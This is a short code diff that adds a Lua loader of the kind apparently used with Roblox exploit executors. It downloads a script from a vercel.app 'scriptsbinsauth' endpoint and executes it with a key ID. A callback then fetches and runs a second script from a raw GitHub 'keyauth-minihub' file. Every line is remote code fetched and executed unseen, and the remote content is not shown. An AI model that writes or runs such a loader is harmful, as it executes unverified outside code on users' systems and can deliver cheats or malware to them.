@@ -1,0 +1,3 @@
+loadstring(game:HttpGet("https://scriptsbinsauth.vercel.app/api/scripts/e948d0a6-7560-45b6-8e6a-c3dc362f5068/raw"))()("4b2c7cbc-39e6-49a7-9998-1b61326dbdba", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/tveiz/keyauth-minihub/refs/heads/main/seila"))()
+end)
